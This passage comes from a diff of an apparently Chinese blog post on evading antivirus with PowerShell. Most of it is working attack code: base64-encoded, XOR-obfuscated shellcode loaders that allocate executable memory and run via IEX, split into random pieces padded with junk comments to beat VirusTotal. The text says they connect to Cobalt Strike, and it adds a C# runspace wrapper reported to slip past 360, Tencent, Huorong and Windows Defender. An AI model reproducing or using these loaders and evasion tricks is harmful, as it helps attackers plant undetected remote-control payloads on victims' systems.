W5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnN&#x27;</span></span><br><span class="line"><span class="variable">$p3</span> = <span class="string">&#x27;Bbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZX&#x27;</span></span><br><span class="line"><span class="variable">$p4</span> = <span class="string">&#x27;RfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($AAA))</span></span><br><span class="line"><span class="variable">$bbb</span>= [<span class="type">System.Text.Encoding</span>]::UTF8.GetString([<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$p1</span>+<span class="variable">$p2</span>+<span class="variable">$p3</span>+<span class="variable">$p4</span>))</span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$bbb</span> | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$bbb</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>可以上线CS</p>
-<p><img src="/posts/adb63639/26.png" alt="截图"></p>
-<p>在VT上没啥变化 </p>
-<p><img src="/posts/adb63639/27.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/26.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>在VT上没啥变化</p>
+<figure>
+<img src="/posts/adb63639/27.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>在进行变换试试</p>
-<p>这里不止可以使用base64 还可以去用 AES 异或 ASCII等方式进行加密 也可以添加一些垃圾注释进行干扰</p>
+<p>这里不止可以使用base64 还可以去用 AES 异或 ASCII等方式进行加密
+也可以添加一些垃圾注释进行干扰</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Set-StrictMode -Version 2</span><br><span class="line"></span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wessda2mpdGd3R6w1da3RmhjTGMzMEt13G9rZShbSW50UHRyXTo6Wm5dasCM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo63r2sdaQycDFhbkYZlFvVVlHQ</span><br><span class="line">$a314fpda9 = &#x27;ZnVuY3Rpb24gZnVuY19nZXRfcHJvY19hZGRyZXNzIHsKCVBhcmFtICgkdmFyX21vZHVsZSwgJHZhcl9wcm9jZWR1cmUpCQkKCSR2YXJfdW5zYWZlX25hdGl2ZV9tZXRob2RzID0gKFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkdldEFzc2VtYmxpZXMoKSB8IFdoZXJlLU9iamVjdCB7ICRfLkdsb2JhbEFzc2VtYmx5Q2FjaGUgLUFuZCAkXy5Mb2NhdGlvbi5TcGxpdCgnXFwnKVstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQoJJHZhcl9ncGEgPSAkdmFyX3V&#x27;</span><br><span class="line">#asdYyY0E1M1puQjNEbVZasdxYjJZ356dqqQ0Iyew4cas0lhd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQ</span><br><span class="line">$psdaadsas = &#x27;uc2FmZV9uYXRpdmVfbWV0aG9kcy5HZXRNZXRob2QoJ0dldFByb2NBZGRyZXNzJywgW1R5cGVbXV0gQCgnU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZicsICdzdHJpbmcnKSkKCXJldHVybiAkdmFyX2dwYS5JbnZva2UoJG51bGwsIEAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5IYW5kbGVSZWZdKE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigoTmV3LU9iamVjdCBJbnRQdHIpLCAoJHZhcl91bnNhZmVfbmF0aXZlX21ldGhvZHMuR2V0TWV0aG9kKCdHZXRNb2R1bGVIYW5kbGUnKSkuSW52b2tlKCRudWxsLCBAKCR2YXJfbW9kdWxlKSkpKSwgJHZhcl9wcm9jZWR1cmUpKQp9CgpmdW5jdGlvbiBmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIHsKCVBhcmFtICgKCQlbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXSBbVHlwZVtdXSAkdmFyX3BhcmFtZXRlcnMsCgkJW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gJHZhcl9yZXR1cm5fdHlwZSA9IFtWb2lkXQoJKQoKCSR2YXJfdHlwZV9idWlsZGVyID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KChOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5TmFtZSgnUmVmbGVjdGVkRGVsZWdhdGUnKSksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikuRGVmaW5lRHluYW1pY01vZHVsZSgnSW5NZW1vcnlNb2R1bGUnLCAkZmFsc2UpLkRlZmluZVR5cGUoJ015RGVsZWdhdGVUeXBlJywgJ0NsYXNzLCBQdWJsaWMsIFNlYWxlZCwgQW5zaUNsYXNzLCBBdXRvQ2xhc3MnLCBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXSkKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZWNpYWxOYW1lLCBIaWRlQnlTaWcsIFB1YmxpYycsIFtTeXN0ZW0uUmVmbGVjdGlvbi5DYWxsaW5nQ29udmVudGlvbnNdOjpTdGFuZGFyZCwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCSR2YXJfdHlwZV9idWlsZGVyLkRlZmluZU1ldGhvZCgnSW52b2tlJywgJ1B1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsJywgJHZhcl9yZXR1cm5fdHlwZSwgJHZhcl9wYXJhbWV0ZXJzKS5TZXRJbXBsZW1lbnRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykKCglyZXR1cm4gJHZhcl90eXBlX2J1aWxkZXIuQ3JlYXRlVHlwZSgpCn0KCltCeXRlW11dJHZhcl9jb2RlID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygnMzh1cUl5TWpRNnJHRXZGSHFIRVRxSEV2cUhFM3FGRUxMSlJwQlJMY0V1T1BIMEpmSVE4RDR1d3VJdVRCMDNGMHFIRXpxR0VmSXZPb1kxdW00MWRwSXZOenFHczdxSHNESXZEQUgycW9GNmdpOVJMY0V1T1A0dXd1SXVRYncxYlhJRjdiR0Y0SFZzRjdxSHNISXZCRnFDOW9xSHMvSXZDb0o2Z2k4NnBuQndkNGVFSjZlWExjdzN0OGVhZ3h5S1YrUzAxR1Z5TkxWRXBOU25kTGIxUUZKTnoyRXR4MGRIUjBkRXNaZFZxRTNQYktweU1qSTNnUzZuSnlTU0J5Y2t0M1BDTWpjSE5MZEtxODVkejJ5Rk40RXZGeFN5TWhZNmR4Y1hGd2NYTkx5SFlOR056MnF1V2c0SE1TM0hSMFNkeHdkVXNPSlR0WTNQYW00eXluNENJakl4TGNwdFZYSjZyYXlDcExpZWJCZnR6MnF1SkxaZ0o5RXR6MkV0eDBTU1J5ZFhOTGxIVERLTnoybkNNTUl5TWE1RmVVRXR6S3NpSWpJOHJxSWlNank2amMzTndNVDJSM2RpTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdJM1pRUmxFT1lrUkdUVmNaQTI1TVdVcFBUMElNRmcwVEF3dEFURTVUUWxkS1FVOUdHQU51Y0dwbUF4b05FeGdEZEVwTlIweFVVQU50ZHdNVkRSSVlBM2RSU2tkR1RWY01GZzBUQ2k0cEl4WnN&#x27;#adfijkhiu2y988hdcbnkjhiugsdaaslkh2eoiheiuoe2hncxxlknxc nvdh9802yuhiodhoahjieasssreshelsa1s</span><br><span class="line">$213rdsaf3 = &#x27;Bbk1HWTJKemVCZC9jM2w3RmhjTGMzMEtGR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdGQycDFhbkYyY0E1M1puQjNEbVZxYjJZQ0Iyc0lhd2tqRm13Q2N3WmpZbk40RjM5emVYc1dGd3R6ZlFvVVlHQUtGRjRIWm1wZ1luRU9jSGRpYldkaWNXY09ZbTEzYW5WcWNYWndEbmRtY0hjT1pXcHZaZ0lIYXdockNTTVdiQUp6Qm1OaWMzZ1hmM041ZXhZWEMzTjlDaFJnWUFvVVhnZG1hbUJpY1E1d2QySnRaMkp4Wnc1aWJYZHFkV3B4ZG5BT2QyWndkdzVsYW05bUFnZHJDR3NKSXhac0FuTUdZMkp6ZUJkL2MzbDdGaGNMYzMwS0ZDTkwwNWFCZGR6MlNXTkxJek1qSTBzakkyTWpkRXQ3aDNERzNQYXdtaU1qSXlNaStuSndxc1IwU3lNREl5TndkVXN4dGFyQjNQYW00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNakl5TT0nKQoKZm9yICgkeCA9IDA7ICR4IC1sdCAkdmFyX2NvZGUuQ291bnQ7ICR4KyspIHsKCSR2YXJfY29kZVskeF0gPSAkdmFyX2NvZGVbJHhdIC1ieG9yIDM1Cn0KCiR2YXJfdmEgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoZnVuY19nZXRfcHJvY19hZGRyZXNzIGtlcm5lbDMyLmRsbCBWaXJ0dWFsQWxsb2MpLCAoZnVuY19nZX&#x27;#fasdhnkjlh2iuhjdcb789gheh289hsko-0e22e</span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYfadsraeawweaewjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZsadaR0p4RG5CM1ltMw23142W5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line">$1sdasfp24 = &#x27;RfZGVsZWdhdGVfdHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdKSAoW0ludFB0cl0pKSkKJHZhcl9idWZmZXIgPSAkdmFyX3ZhLkludm9rZShbSW50UHRyXTo6WmVybywgJHZhcl9jb2RlLkxlbmd0aCwgMHgzMDAwLCAweDQwKQpbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCR2YXJfY29kZSwgMCwgJHZhcl9idWZmZXIsICR2YXJfY29kZS5sZW5ndGgpCgokdmFyX3J1bm1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJHZhcl9idWZmZXIsIChmdW5jX2dldF9kZWxlZ2F0ZV90eXBlIEAoW0ludFB0cl0pIChbVm9pZF0pKSkKJHZhcl9ydW5tZS5JbnZva2UoW0ludFB0cl06Olplcm8p&#x27;</span><br><span class="line">#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line"></span><br><span class="line">$bbb= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a314fpda9+$psdaadsas+$213rdsaf3+$1sdasfp24))#JKemVCZC9jM2w3RmhjTGkkyTWpkRXQ3aDNERzNQYXdtaU00MWZscUNRaTRLYmpWc1o3NE11SzN0emNFaE1ORWhNTkVoTU5FaElYSXlNa)</span><br><span class="line">If ([IntPtr]::size -eq 8  ) &#123;#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9rZShbSW50UHRyXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQ</span><br><span class="line">	start-job &#123; param($a) IEX $a &#125; -RunAs32 -Argument $bbb | wait-job | Receive-Job #dsasafaaffafaaffaasdsa31241412sdad231 rfdadsaf43gv213aat64zxcr</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">	IEX $bbb  #asd22jnk43lhjsd9u23nkl#asdYyY0E1hd2tqRm13Q2N3Wes2mpZbk40RjM5emVYc1dGd3R6w3RmhjTGMzMEtG9ryXTo6WmVybyR0JnQ2hSZUIyWnFZR0p4RG5CM1ltMW5ZbkZuRG1KdG9rZShbSW50UHRyXTo6WmVybyQycDFhbkYZlFvVVlHQf89dy890w3epoi2j231r34ra</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/adb63639/28.png" alt="截图"></p>
-<p>可以看到从15减到了5 添加垃圾注释还是有效果的 但是被amsi拦截了  无法绕过WinDef </p>
+<figure>
+<img src="/posts/adb63639/28.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>可以看到从15减到了5 添加垃圾注释还是有效果的 但是被amsi拦截了
+无法绕过WinDef</p>
 <p><img src="/posts/adb63639/nbpwdf.png"></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA">https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</a></p>
-<p>这篇文章将ps的payload 随机分段 这样每次都不会相同 而杀软有时会记录特征 固定的几段可能会失效，而随机切片分段效果会好些</p>
-<br>
-
-<h3 id="C-调用WINAPI"><a href="#C-调用WINAPI" class="headerlink" title="C#调用WINAPI"></a>C#调用WINAPI</h3><p>项目地址 <a target="_blank" rel="noopener" href="https://github.com/INotGreen/nopowershell">https://github.com/INotGreen/nopowershell</a> <strong>感谢格林师傅提供的免杀文章</strong></p>
-<p>在VS中导入C:\Program Files (x86)\Reference Assemblies\Microsoft\WindowsPowerShell\3.0 到项目中</p>
-<p>通过调用windows的API去执行powershell命令 从而去绕过360对powershell的禁用</p>
+<p>https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</p>
+<p>这篇文章将ps的payload 随机分段 这样每次都不会相同
+而杀软有时会记录特征 固定的几段可能会失效，而随机切片分段效果会好些</p>
+<p><br></p>
+<h3 id="c调用winapi">C#调用WINAPI</h3>
+<p>项目地址 https://github.com/INotGreen/nopowershell
+<strong>感谢格林师傅提供的免杀文章</strong></p>
+<p>在VS中导入C:Files (x86)Assemblies\3.0 到项目中</p>
+<p>通过调用windows的API去执行powershell命令
+从而去绕过360对powershell的禁用</p>
 <figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">nopowershell</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Programe</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">byte</span>[] psrevshell = Convert.FromBase64String(<span class="string">&quot;Y2FsYw==&quot;</span>); <span class="comment">//base64 ps1 shellcode</span></span><br><span class="line">            <span class="built_in">string</span> decodedString = Encoding.UTF8.GetString(psrevshell);</span><br><span class="line">            Runspace rs = RunspaceFactory.CreateRunspace();</span><br><span class="line">            rs.Open();</span><br><span class="line">            Pipeline pipeline = rs.CreatePipeline();</span><br><span class="line">            pipeline.Commands.AddScript(decodedString);</span><br><span class="line">            pipeline.Invoke();</span><br><span class="line">            rs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p>编译后 动态静态都可过360 腾讯 火绒 但是在运行后会出现一个黑框，需要改一下项目(修改项目的属性–&gt; 输出类型 改为 Windows应用程序即可消除黑框)</p>
+<p><br></p>
+<p>编译后 动态静态都可过360 腾讯 火绒
+但是在运行后会出现一个黑框，需要改一下项目(修改项目的属性--&gt; 输出类型
+改为 Windows应用程序即可消除黑框)</p>
 <p><img src="/posts/adb63639/29.png"></p>
 <p>这个也可以绕过WinDef</p>
 <p><img src="/posts/adb63639/33.png"></p>
-<br>
-
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><strong>感谢格林大佬的提供的学习文章和项目</strong> Orz !!!</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/INotGreen/nopowershell">https://github.com/INotGreen/nopowershell</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hungchuiho/article/details/121436429">https://blog.csdn.net/Hungchuiho/article/details/121436429</a></p>
-<p><a href="https://mamor5409.github.io/posts/359bf983/">https://mamor5409.github.io/posts/359bf983/</a></p>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA">https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</a></p>
+<p><br></p>
+<h3 id="references">References</h3>
+<p><strong>感谢格林大佬的提供的学习文章和项目</strong> Orz !!!</p>
+<p>https://github.com/INotGreen/nopowershell</p>
+<p>https://blog.csdn.net/Hungchuiho/article/details/121436429</p>
+<p>https://mamor5409.github.io/posts/359bf983/</p>
+<p>https://mp.weixin.qq.com/s/znyLqniUX_WXRizGV6TQlA</p>
 
     </div>
 
@@ -667,7 +753,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell%E7%9A%84%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">powershell的执行策略问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-PSimage%E5%9B%BE%E7%89%87%E6%B7%B7%E6%B7%86powershell%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">Invoke-PSimage图片混淆powershell代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Invoke-Obfuscation%E6%B7%B7%E6%B7%86"><span class="nav-number">4.</span> <span class="nav-text">Invoke Obfuscation混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Powershell-socket%E5%85%8D%E6%9D%80"><span class="nav-number">5.</span> <span class="nav-text">Powershell socket免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PS1%E6%BA%90%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86-%E8%A1%8C%E4%B8%BA%E5%85%8D%E6%9D%80"><span class="nav-number">6.</span> <span class="nav-text">PS1源文件命令混淆(行为免杀)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81powershell-%E9%9A%8F%E6%9C%BA%E5%88%86%E6%AE%B5-%E5%9E%83%E5%9C%BE%E6%B3%A8%E9%87%8A"><span class="nav-number">7.</span> <span class="nav-text">base64编码powershell+随机分段+垃圾注释</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#C-%E8%B0%83%E7%94%A8WINAPI"><span class="nav-number">8.</span> <span class="nav-text">C#调用WINAPI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">9.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell%E7%9A%84%E6%89%A7%E8%A1%8C%E7%AD%96%E7%95%A5%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">powershell的执行策略问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke-psimage%E5%9B%BE%E7%89%87%E6%B7%B7%E6%B7%86powershell%E4%BB%A3%E7%A0%81"><span class="nav-number">3.</span> <span class="nav-text">Invoke-PSimage图片混淆powershell代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#invoke-obfuscation%E6%B7%B7%E6%B7%86"><span class="nav-number">4.</span> <span class="nav-text">Invoke Obfuscation混淆</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#powershell-socket%E5%85%8D%E6%9D%80"><span class="nav-number">5.</span> <span class="nav-text">Powershell socket免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ps1%E6%BA%90%E6%96%87%E4%BB%B6%E5%91%BD%E4%BB%A4%E6%B7%B7%E6%B7%86%E8%A1%8C%E4%B8%BA%E5%85%8D%E6%9D%80"><span class="nav-number">6.</span> <span class="nav-text">PS1源文件命令混淆(行为免杀)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 